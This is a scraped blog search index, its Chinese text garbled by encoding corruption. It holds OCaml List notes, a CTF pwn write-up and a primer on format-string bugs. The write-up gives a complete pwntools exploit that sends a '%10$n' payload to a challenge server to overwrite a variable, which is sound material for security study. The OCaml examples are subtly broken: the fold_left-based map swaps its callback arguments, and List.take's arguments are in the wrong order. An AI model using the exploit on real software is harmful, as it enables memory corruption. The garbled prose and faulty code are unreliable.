-&gt; &#x27;b t -&gt; (&#x27;a * &#x27;b) t val sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val stable_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val fast_sort : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val sort_uniq : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t val merge : (&#x27;a -&gt; &#x27;a -&gt; int) -&gt; &#x27;a t -&gt; &#x27;a t -&gt; &#x27;a t val to_seq : &#x27;a t -&gt; &#x27;a Seq.t val of_seq : &#x27;a Seq.t -&gt; &#x27;a t end List.fold_leftè¯­æ³•ï¼š 1List.fold_left f acc lst fï¼šæ˜¯ä¸€ä¸ªâ€œç´¯ç§¯å‡½æ•°â€ï¼Œå®šä¹‰å¦‚ä½•å¤„ç†å½“å‰å…ƒç´ å’Œç´¯ç§¯å€¼ã€‚ å®ƒçš„ç±»å‹æ˜¯ (&#39;a -&gt; &#39;b -&gt; &#39;a)ï¼Œå³æ¥æ”¶å½“å‰ç´¯ç§¯å€¼å’Œå½“å‰å…ƒç´ ï¼Œè¿”å›æ–°çš„ç´¯ç§¯å€¼ã€‚ accï¼šæ˜¯åˆå§‹ç´¯ç§¯å€¼ã€‚ lstï¼šæ˜¯è¦å¤„ç†çš„åˆ—è¡¨ã€‚ ä»åˆ—è¡¨çš„å·¦è¾¹å¼€å§‹ï¼Œä¾æ¬¡ç”¨ f æ›´æ–°ç´¯ç§¯å€¼ã€‚ ä¾‹å­ï¼š ç”¨äºå®ç°ä¹‹å‰çš„åˆ—è¡¨æ˜ å°„å‡½æ•°mapï¼š 12let map f lst = List.rev (List.fold_left (fun x acc -&gt; (f x) :: acc) lst []);; List.revå®šä¹‰ï¼š 1List.rev : &#x27;a list -&gt; &#x27;a list è¿”å›ä¸€ä¸ªåè½¬åçš„åˆ—è¡¨ã€‚ ç¤ºä¾‹ï¼š 12List.rev [1; 2; 3];;(* ç»“æœ: [3; 2; 1] *) List.mapå®šä¹‰ï¼š 1List.map : (&#x27;a -&gt; &#x27;b) -&gt; &#x27;a list -&gt; &#x27;b list å¯¹åˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ åº”ç”¨å‡½æ•°ï¼ŒæŒ‰åŸé¡ºåºç”Ÿæˆç­‰é•¿çš„æ–°åˆ—è¡¨ã€‚ ç¤ºä¾‹ï¼š 12345List.map (fun x -&gt; x * x) [1; 2; 3];;(* ç»“æœ: [1; 4; 9] *)List.map String.length [&quot;ab&quot;; &quot;c&quot;; &quot;def&quot;];;(* ç»“æœ: [2; 1; 3] *) List.flatten/List.concatå®šä¹‰ï¼š 1List.flatten : &#x27;a list list -&gt; &#x27;a list æŠŠåˆ—è¡¨çš„åˆ—è¡¨ ï¼ˆList of listsï¼‰æŒ‰é¡ºåºæ‹¼æ¥ä¸ºä¸€ä¸ªåˆ—è¡¨ã€‚ ç¤ºä¾‹ï¼š 12345List.flatten [[1; 2]; []; [3]; [4; 5]];;(* ç»“æœ: [1; 2; 3; 4; 5] *)List.flatten [[&quot;ab&quot;; &quot;cd&quot;]; [&quot;ef&quot;]];;(* ç»“æœ: [&quot;ab&quot;; &quot;cd&quot;; &quot;ef&quot;] *) List.concat_mapå®šä¹‰ï¼š 1List.concat_map : (&#x27;a -&gt; &#x27;b list) -&gt; &#x27;a list -&gt; &#x27;b list â€œå…ˆæ˜ å°„ã€å†æ‹å¹³â€çš„ç»„åˆã€‚ List.concat_map f xs ç­‰ä»·äº List.flatten (List.map f xs)ã€‚ ç¤ºä¾‹ï¼š 12345List.concat_map (fun x -&gt; [x; x * x]) [1; 2; 3];;(* ç»“æœ: [1; 1; 2; 4; 3; 9] *)List.concat_map (fun s -&gt; List.of_seq (String.to_seq s)) [&quot;ab&quot;; &quot;cd&quot;];;(* ç»“æœ: [&#x27;a&#x27;; &#x27;b&#x27;; &#x27;c&#x27;; &#x27;d&#x27;] *) List.filterè¯­æ³•ï¼š 1List.filter (fun x -&gt; condition) list List.filterï¼šç”¨äºä»åˆ—è¡¨ä¸­æŒ‘é€‰ç¬¦åˆæ¡ä»¶çš„å…ƒç´ ã€‚ å‚æ•°ï¼š fun x -&gt; conditionï¼šä¸€ä¸ªå‡½æ•°ï¼Œå¯¹åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´  x åˆ¤æ–­æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼ˆcondition æ˜¯å¸ƒå°”è¡¨è¾¾å¼ï¼‰ã€‚ listï¼šè¦è¿‡æ»¤çš„åˆ—è¡¨ã€‚ è¿”å›å€¼ï¼šä¸€ä¸ªæ–°åˆ—è¡¨ï¼ŒåŒ…å«åŸåˆ—è¡¨ä¸­æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„å…ƒç´ ã€‚ List.conså®šä¹‰ï¼š 1List.cons : &#x27;a -&gt; &#x27;a list -&gt; &#x27;a list ä¹Ÿå°±æ˜¯ :: è¿ç®—ç¬¦çš„å‡½æ•°å½¢å¼ï¼šæŠŠä¸€ä¸ªå…ƒç´ æ”¾åˆ°ä¸€ä¸ªåˆ—è¡¨çš„å‰é¢ï¼ˆå³â€œæ„é€ â€ä¸€ä¸ªæ–°åˆ—è¡¨ï¼‰ã€‚ ç¤ºä¾‹ï¼š 12List.cons 1 [2;3];;(* ç»“æœ: [1;2;3] *) ç›¸å½“äºï¼š 11 :: [2;3] List.takeå®šä¹‰ï¼š 1List.take : int -&gt; &#x27;a list -&gt; &#x27;a list ï¼ˆæ¥æºï¼š https://ocaml.org/manual/5.3/api/List.html ã€‚5.3ç‰ˆæœ¬é‡Œä¹Ÿæœ‰ã€‚ï¼‰ å–å‡ºåˆ—è¡¨å‰ n ä¸ªå…ƒç´ ï¼Œå¦‚æœåˆ—è¡¨é•¿åº¦å°äº nï¼Œå°±è¿”å›æ•´ä¸ªåˆ—è¡¨ã€‚ ç¤ºä¾‹ï¼š 12List.take [10;20;30;40] 2;;(* ç»“æœ: [10;20] *) List.nthå®šä¹‰ï¼š 1List.nth : &#x27;a list -&gt; int -&gt; &#x27;a ä»åˆ—è¡¨ä¸­å–å‡ºç¬¬ n ä¸ªå…ƒç´ ï¼ˆ0-basedï¼‰ï¼Œå¦‚æœè¶Šç•Œåˆ™æŠ›å¼‚å¸¸ã€‚ ç¤ºä¾‹ï¼š 12List.nth [&quot;a&quot;;&quot;b&quot;;&quot;c&quot;] 1;;(* ç»“æœ: &quot;b&quot; *)","categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"Ocaml","slug":"Ocaml","permalink":"https://archer-baiyi.github.io/tags/Ocaml/"}]},{"title":"æ”»é˜²ä¸–ç•Œ CGfsb Writeup","slug":"CTF/Pwn/æ”»é˜²ä¸–ç•Œ-CGfsb-Writeup","date":"2025-05-19T14:32:48.000Z","updated":"2025-06-10T19:06:45.477Z","comments":true,"path":"2025/05/19/CTF/Pwn/æ”»é˜²ä¸–ç•Œ-CGfsb-Writeup/","permalink":"https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CGfsb-Writeup/","excerpt":"åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¿®æ”¹ç›®æ ‡å˜é‡çš„å€¼ã€‚","text":"é¢˜ç›® è§‚å¯Ÿä½¿ç”¨IDAæ‰“å¼€æ–‡ä»¶ï¼š æ³¨æ„åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat Stringï¼‰æ¼æ´çš„å¸¸è§æ¼æ´ï¼š 12fgets(s, 100, stdin);printf(s); å¹¶æ³¨æ„åˆ°mainå‡½æ•°é‡Œçš„é€»è¾‘ï¼Œåªè¦pwnmeçš„å€¼ç­‰äº8æˆ‘ä»¬å³å¯å¾—åˆ°flagã€‚ æ‰¾åˆ°pwnmeçš„åœ°å€ï¼š 10804A068 Exploité¦–å…ˆå‘é€è¿™ä¸ªPayload 123456789101112131415161718from pwn import *host = &quot;61.147.171.105&quot;port = 59350r = remote(host, port)test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot; # ç”±äºæ²¡æœ‰ç»™åç»­çš„å‚æ•°ï¼Œæ‰€ä»¥ç¨‹åºä¼šè‡ªåŠ¨ä»Stackä¸ŠæŒ‰é¡ºåºè¯»å–15ä¸ªå€¼ã€‚r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)r.sendline(test_payload)# r.sendline(payload)r.interactive() ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š 1234hello Ayour message is:AAAA,ff91236e,f7f4a5a0,f0b5ff,ff91239e,1,c2,a4198fb,0,0,41414141,2c78252c,252c7825,78252c78,2c78252c,252c7825Thank you! å¯ä»¥å‘ç°ç¬¬10ä¸ªå€¼41414141æ­£æ˜¯AAAAå¯¹åº”çš„ASCIIç ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸­çš„åç§»æ˜¯ç¬¬ 10 ä¸ªä½ç½®ã€‚ï¼ˆå› ä¸ºæˆ‘ä»¬çš„è¾“å…¥æ˜¯ç”±fgetså†™å…¥è¿›sçš„ï¼Œæ‰€ä»¥ä¼šå’Œprintfè¯»å–çš„ä½ç½®æœ‰åå·®ã€‚ï¼‰ ç¡®å®šå‚æ•°ä½ç½®äº†ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡è¿™ä¸ªPayloadä¿®æ”¹pwnmeçš„å€¼äº†ï¼š 123pwnme_addr = 0x0804A068payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27; é¦–å…ˆå¡«éœ€è¦ä¿®æ”¹çš„æ•°æ®çš„åœ°å€ï¼ˆå› ä¸ºæ˜¯32-bitçš„ç¨‹åºï¼Œæ‰€ä»¥åœ°å€æ˜¯32ä½ï¼Œä¹Ÿå°±æ˜¯4ä¸ªByteï¼‰ï¼Œç”±äºæˆ‘ä»¬å¸Œæœ›å°†pwnmeçš„å€¼ä¿®æ”¹ä¸º8ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦åŠ 4 Byteçš„paddingï¼Œä¹Ÿå°±æ˜¯4ä¸ªâ€aâ€ã€‚ è€Œ%10$n çš„æ„æ€æ˜¯ä» ç¬¬10ä¸ªå‚æ•°ä½ç½® å–å‡ºä¸€ä¸ªåœ°å€ï¼Œç„¶åæŠŠå·²ç»æ‰“å°å‡ºæ¥çš„å­—ç¬¦æ€»æ•°ï¼ˆ4+4=8ï¼‰å†™å…¥é‚£ä¸ªåœ°å€ã€‚ å®Œæ•´ä»£ç ï¼š 12345678910111213141516171819202122232425262728from pwn import *host = &quot;61.147.171.105&quot;port = 59350pwnme_addr = 0x0804A068r = remote(host, port)# test_payload = b&quot;AAAA&quot; + 15*b&quot;,%x&quot;payload = p32(pwnme_addr) + b&#x27;aaaa%10$n&#x27;r.recvuntil(&quot;your name:&quot;)r.sendline(&quot;A&quot;)r.recvuntil(&quot;leave your message please:&quot;)# r.sendline(test_payload)r.sendline(payload)r.interactive() # hello A# your message is:# haaaa# you pwned me, here is your flag:# cyberpeace&#123;0a7cd9ddadcf7730d41928c9c3877ee8&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat Stringï¼‰æ¼æ´ä»‹ç»","slug":"CTF/Pwn/æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat-Stringï¼‰æ¼æ´ä»‹ç»","date":"2025-05-19T08:08:10.000Z","updated":"2025-11-10T17:22:41.867Z","comments":true,"path":"2025/05/19/CTF/Pwn/æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat-Stringï¼‰æ¼æ´ä»‹ç»/","permalink":"https://archer-baiyi.github.io/2025/05/19/CTF/Pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88Format-String%EF%BC%89%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆ format stringï¼‰å‡½æ•°å¯ä»¥æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œå¹¶å°†ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œæ ¹æ®å…¶æ¥è§£æä¹‹åçš„å‚æ•°ã€‚ å¯ä»¥å‚è€ƒè¿™ä¸ªå®šä¹‰ï¼š The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. ï¼ˆæ¥æºï¼šhttps://ocaml.org/manual/5.0/api/Printf.htmlï¼‰ ä¸€èˆ¬æ¥è¯´ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨åˆ©ç”¨çš„æ—¶å€™ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•° æ ¼å¼åŒ–å­—ç¬¦ä¸² å˜é‡ï¼Œå¯é€‰ ä¾‹å­ï¼š 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %dæ˜¯è¾“å‡ºæ§åˆ¶ç¬¦ï¼Œd è¡¨ç¤ºåè¿›åˆ¶ï¼Œåé¢çš„ i æ˜¯è¾“å‡ºå‚æ•°* return 0;&#125; æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°åˆ†ä¸ºè¾“å…¥å’Œè¾“å‡ºï¼Œå…¶ä¸­ - è¾“å…¥ï¼š å‡½æ•° è¯´æ˜ scanf() ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ® åŸºæœ¬è¯­æ³•ï¼š 1scanf(&quot;æ ¼å¼å­—ç¬¦ä¸²&quot;, &amp;å˜é‡1, &amp;å˜é‡2, ...); ä¾‹å­ï¼š 123456789101112# include &lt;stdio.h&gt;int main(void)&#123; int age; float height; char name[20]; scanf(&quot;%d %f %s&quot;, &amp;age, &amp;height, name); return 0;&#125; æ³¨æ„ï¼šscanf(&quot;%s&quot;, name); ä¸éœ€è¦åŠ  &amp;ï¼Œå› ä¸ºæ•°ç»„åæœ¬èº«å°±æ˜¯åœ°å€ã€‚ - è¾“å‡ºï¼š å‡½æ•°å è¯´æ˜ printf å‘æ ‡å‡†è¾“å‡ºï¼ˆé€šå¸¸æ˜¯ç»ˆç«¯ï¼‰æ‰“å°æ ¼å¼åŒ–å­—ç¬¦ä¸² fprintf å‘æŒ‡å®šæ–‡ä»¶æµæ‰“å°æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆå¦‚ stderr, æ–‡ä»¶æŒ‡é’ˆç­‰ï¼‰ sprintf å°†æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥å­—ç¬¦æ•°ç»„ï¼ˆæ³¨æ„ç¼“å†²åŒºæº¢å‡ºé£é™©ï¼‰ snprintf å°†æ ¼å¼åŒ–çš„å­—ç¬¦ä¸²å†™å…¥å­—ç¬¦æ•°ç»„ï¼ŒæŒ‡å®šæœ€å¤§å†™å…¥é•¿åº¦ï¼Œæ›´å®‰å…¨ asprintf å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆGNU æ‰©å±•ï¼Œéæ ‡å‡† Cï¼‰ dprintf å‘æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦å†™å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆPOSIXï¼Œå¸¸ç”¨äºç³»ç»Ÿç¼–ç¨‹ï¼‰ vprintf ç±»ä¼¼ printfï¼Œä½†å‚æ•°é€šè¿‡ va_list ä¼ é€’ï¼ˆç”¨äºå˜å‚å‡½æ•°ï¼‰ vfprintf ç±»ä¼¼ fprintfï¼Œå‚æ•°ä¸º va_list vsprintf ç±»ä¼¼ sprintfï¼Œå‚æ•°ä¸º va_listï¼ˆä¸å®‰å…¨ï¼‰ vsnprintf ç±»ä¼¼ snprintfï¼Œå‚æ•°ä¸º va_listï¼ˆæ¨èç”¨äºå˜å‚å®‰å…¨æ ¼å¼åŒ–ï¼‰ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ­£å¦‚ä¸Šé¢çš„å®šä¹‰é‡Œè¯´çš„ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²é‡Œé™¤äº†æ˜æ–‡è¿˜æœ‰æ ¼å¼åŒ–å ä½ç¬¦ã€‚æˆ‘ä»¬è¿™é‡Œæ¥é‡ç‚¹å…³æ³¨ä¸€ä¸‹è¿™ä¸ªæ ¼å¼åŒ–å ä½ç¬¦ã€‚ æ ¼å¼åŒ–å ä½ç¬¦ï¼ˆconversion specificationsï¼‰çš„è¯­æ³•å¦‚ä¸‹ï¼š 1%[parameter][flags][field width][.precision][length]type - Parameterï¼šæŒ‡å®šç”¨äºæ ¼å¼åŒ–çš„å‚æ•°ä½ç½®ï¼ˆä»1å¼€å§‹ï¼‰ å­—ç¬¦ è¯´æ˜ n$ å…¶ä¸­næ˜¯å‚æ•°ä½ç½® ä¾‹å­ï¼š 12printf(&quot;%2$d %1$d&quot;, 11, 22);// ä¼šè¾“å‡º 22 11 - Flagsï¼š æ ‡å¿— è¯´æ˜ - å·¦å¯¹é½ï¼ˆé»˜è®¤æ˜¯å³å¯¹é½ï¼‰ + æ€»æ˜¯æ˜¾ç¤ºæ­£å·æˆ–è´Ÿå·ï¼ˆä¾‹å¦‚ +10ï¼‰ (ç©ºæ ¼) æ­£æ•°å‰åŠ ç©ºæ ¼ï¼Œè´Ÿæ•°å‰åŠ è´Ÿå· 0 ç”¨0å¡«å……æœªå æ»¡çš„å®½åº¦ # å¯¹äº%oã€%xã€%Xç­‰ï¼Œæ·»åŠ å‰ç¼€ï¼ˆå¦‚0xï¼‰ï¼›å¯¹äº%fç­‰ï¼Œå§‹ç»ˆåŒ…å«å°æ•°ç‚¹ - Field Widthï¼šæŒ‡å®šæœ€å°è¾“å‡ºå­—ç¬¦æ•°ï¼Œä¸è¶³æ—¶ç”¨ç©ºæ ¼ï¼ˆæˆ–0ï¼‰å¡«å……ï¼Œå¦‚æœè¦ä½¿ç”¨å˜é‡æŒ‡å®šå®½åº¦ï¼Œå¯ä»¥ç”¨ *ã€‚ ä¾‹å­ï¼š 12345printf(&quot;%d&quot;, 42);// ä¼šè¾“å‡º &quot; 42&quot; ï¼ˆå‰é¢æœ‰3ä¸ªç©ºæ ¼ï¼‰printf(&quot;%*d&quot;, 5, 42);// ä¼šè¾“å‡º &quot; 42&quot; ï¼ˆå‰é¢æœ‰3ä¸ªç©ºæ ¼ï¼‰ - Precisionï¼šæŒ‡å®šæ•°å­—å°æ•°ç‚¹åçš„ä½æ•°æˆ–å­—ç¬¦ä¸²çš„æœ€å¤§è¾“å‡ºé•¿åº¦ï¼š å¯¹äºæµ®ç‚¹æ•°ï¼ˆå¦‚ %fï¼‰ï¼šè¡¨ç¤ºå°æ•°ç‚¹åä¿ç•™çš„ä½æ•°ï¼Œå¦‚ %.2f å¯¹äºå­—ç¬¦ä¸²ï¼ˆå¦‚ %sï¼‰ï¼šè¡¨ç¤ºæœ€å¤§è¾“å‡ºå­—ç¬¦æ•°ï¼Œå¦‚ %.5s å¯ä»¥ä½¿ç”¨ * è¡¨ç¤ºç”±å‚æ•°åŠ¨æ€æä¾› - Lengthï¼šæŒ‡å‡ºæµ®ç‚¹å‹å‚æ•°æˆ–æ•´å‹å‚æ•°çš„é•¿åº¦ ä¿®é¥°ç¬¦ è¯´æ˜ hh signed char æˆ– unsigned char h short æˆ– unsigned short l long æˆ– unsigned long ll long long æˆ– unsigned long long L long doubleï¼ˆç”¨äº%Lfï¼‰ z size_t t ptrdiff_t j intmax_t æˆ– uintmax_t ä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // ä¼šè¾“å‡º &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // ä¼šè¾“å‡º &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // ä¼šè¾“å‡º &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // ä¼šè¾“å‡º &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // ä¼šè¾“å‡º &quot;3.141593&quot;ï¼ˆé»˜è®¤ä¿ç•™6ä½å°æ•°ï¼‰ size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // ä¼šè¾“å‡º &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // ä¼šè¾“å‡º &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // ä¼šè¾“å‡º &quot;9223372036854775807&quot; return 0;&#125; - Typeï¼šä¹Ÿç§°è½¬æ¢è¯´æ˜ï¼ˆconversion specification/specifierï¼‰ï¼ŒæŒ‡å®šå…·ä½“çš„æ•°æ®ç±»å‹ï¼Œæœ‰ä»¥ä¸‹é€‰æ‹© å­—ç¬¦ è¯´æ˜ %p æ‰“å°æŒ‡é’ˆï¼ˆåå…­è¿›åˆ¶åœ°å€ï¼‰ %x æ‰“å°åå…­è¿›åˆ¶ï¼ˆå°å†™ï¼‰ %s æ‰“å°å­—ç¬¦ä¸²ï¼ˆchar*ï¼‰ï¼Œå³æ‰“å°æŸä¸ªåœ°å€é‡Œçš„å†…å®¹ã€‚ %.2f æ‰“å°æµ®ç‚¹æ•°ï¼Œä¿ç•™å°æ•°ç‚¹å2ä½ %f æ‰“å°æµ®ç‚¹æ•°ï¼ˆfloat/doubleï¼‰ %c æ‰“å°å•ä¸ªå­—ç¬¦ï¼ˆcharï¼‰ %d æ‰“å°åè¿›åˆ¶æ•´æ•°ï¼ˆintï¼‰ %% è¾“å‡ºä¸€ä¸ªç™¾åˆ†å· % å…¶ä¸­åªæœ‰Typeæ˜¯å¿…é¡»è¦ç»™çš„ï¼Œå…¶ä»–å‡å¯ä»¥çœç•¥ã€‚ ä¾‹å­ï¼š 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;æ•´æ•°ï¼š%d\\n&quot;, i); printf(&quot;æµ®ç‚¹æ•°ï¼ˆé»˜è®¤ï¼‰ï¼š%f\\n&quot;, pi); printf(&quot;æµ®ç‚¹æ•°ï¼ˆä¿ç•™ä¸¤ä½ï¼‰ï¼š%.2f\\n&quot;, pi); printf(&quot;å­—ç¬¦ä¸²ï¼š%s\\n&quot;, name); printf(&quot;å­—ç¬¦ï¼š%c\\n&quot;, letter); printf(&quot;åå…­è¿›åˆ¶ï¼š%x\\n&quot;, hex); printf(&quot;ç™¾åˆ†å·ï¼š%%\\n&quot;); return 0;&#125; æ³¨æ„ï¼šåœ¨ç¬¬äºŒéƒ¨åˆ†ä¸€å®šè¦ç»™å®šå˜é‡ï¼Œå¦‚æœæ²¡æœ‰ç»™ï¼Œåˆ™ä¼šä»é”™è¯¯çš„å†…å­˜åœ°å€è¯»å–æ•°æ®ï¼Œå¯¼è‡´ä¸å¯é¢„æœŸçš„è¡Œä¸ºã€‚ æ­¤å¤–è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æ ¼å¼ç¬¦ï¼š%n ã€‚è¿™ä¸ªæ ¼å¼ç¬¦ä¼šè®© printf æŠŠå½“å‰å·²ç»æ‰“å°çš„å­—ç¬¦æ•°é‡å†™å…¥nã€‚ï¼ˆæˆ–è€…è¯´å†™å…¥ç»™å®šçš„åœ°å€ã€‚ï¼‰ æ¯”å¦‚è¯´ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼ˆæ­£å¸¸ç”¨æ³•ï¼‰ 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; nçš„å€¼ä¼šè¢«å­˜å‚¨ä¸º5ã€‚ ç”±äºå®ƒçš„ç‰¹æ®Šæ€§ä»¥åŠå±é™©æ€§ï¼Œå¾ˆå¤šç°ä»£ç³»ç»Ÿåœ¨libcä¸­ç¦ç”¨äº† %nï¼Œæˆ–è€…åœ¨æ ¼å¼åŒ–å‡½æ•°ä¸Šå¢åŠ äº†ä¿æŠ¤ï¼ˆå¦‚glibcä¸­å¯¹ %n çš„æ ¼å¼æ£€æŸ¥ï¼‰ã€‚ ä¸è¿‡æ­£æ˜¯å› ä¸ºå®ƒçš„å±é™©æ€§æ‰€ä»¥æˆ‘ä»¬åœ¨pwné‡Œç»å¸¸ä¼šç”¨å®ƒæ¥ä¿®æ”¹å†…å­˜æ•°æ® å˜é‡å¸Œæœ›è¾“å‡ºçš„å˜é‡ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ­£å¸¸æƒ…å†µï¼šåœ¨è¿›å…¥printfå‡½æ•°ä¹‹åï¼Œå‡½æ•°ä¼šé¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ å½“å‰å­—ç¬¦ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºã€‚ å½“å‰å­—ç¬¦æ˜¯%ï¼Œ ç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ å¦‚æœæ²¡æœ‰å­—ç¬¦ï¼ŒæŠ¥é”™ å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%, è¾“å‡º% å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º ä¾‹å­ï¼š 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14f; // æ³¨æ„ï¼šä¼ å…¥å˜å‚ä¼šè¢«â€œé»˜è®¤å®å‚æå‡â€ä¸º double char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; å‚æ•°æ˜¯æ€ä¹ˆä¼ è¿› printf çš„ï¼ˆ32-bit å’Œ 64-bitï¼‰32-bitï¼ˆcdeclï¼‰â€”â€”å…¨éƒ¨èµ°æ ˆ å˜å‚æœ‰â€œé»˜è®¤å®å‚æå‡ï¼ˆdefault argument promotionsï¼‰â€ï¼šfloat ä¼šæå‡ä¸º doubleï¼ˆå  8 å­—èŠ‚ï¼‰ï¼Œchar/short æå‡ä¸º intã€‚ å…¸å‹è°ƒç”¨æ—¶æ ˆçš„ç¤ºæ„ï¼ˆè‡ªä¸Šè€Œä¸‹æ˜¯ä½åœ°å€ â†’ é«˜åœ°å€ï¼Œæˆ–æŒ‰â€œè°ƒç”¨ç°åœºä»ä¸‹å¾€ä¸Šâ€ç†è§£ä¹Ÿå¯ä»¥ï¼‰ï¼š 1234567891011+------------------------------+| è¿”å›åœ°å€ï¼ˆprintf ç»“æŸåè·³è½¬ï¼‰ |+------------------------------+| æ ¼å¼å­—ç¬¦ä¸²åœ°å€ | --&gt; &quot;Int: %d, Float: %f, String: %s\\n&quot;+------------------------------+| å‚æ•°3ï¼ˆstrï¼Œ4Bï¼‰ | --&gt; æŒ‡å‘ &quot;hello&quot;+------------------------------+| å‚æ•°2ï¼ˆbï¼Œdoubleï¼Œ8Bï¼‰ | --&gt; 3.14ï¼ˆå·²æå‡ï¼‰+------------------------------+| å‚æ•°1ï¼ˆaï¼Œ4Bï¼‰ | --&gt; 10+------------------------------+ printf åœ¨è§£æåˆ° %d/%f/%s æ—¶ï¼Œä¼šä»â€œç¬¬ä¸€ä¸ªå¯å˜å‚æ•°æ§½ä½â€å¼€å§‹ï¼Œä¾æ¬¡å–â€œ4B/8B/æŒ‡é’ˆâ€çš„å€¼å¹¶æ ¼å¼åŒ–è¾“å‡ºã€‚ x86-64ï¼ˆSystem V ABIï¼‰â€”â€”å¯„å­˜å™¨ä¼˜å…ˆ + 